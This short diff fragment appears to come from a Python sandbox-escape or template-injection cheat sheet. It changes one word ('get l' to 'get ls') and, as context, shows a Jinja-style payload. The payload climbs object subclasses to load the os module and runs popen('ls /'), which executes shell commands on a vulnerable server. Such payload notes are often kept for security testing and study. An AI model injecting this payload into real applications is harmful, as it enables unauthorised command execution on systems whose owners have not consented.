@@ -22,7 +22,7 @@ Alternative __enter__ or __exit__:
 
 ```
 
-get l
+get ls
 ```
 {{[].__class__.__base__.__subclasses__()[84]["load_module"]("os")["popen"]("ls /").read()}}
 ```
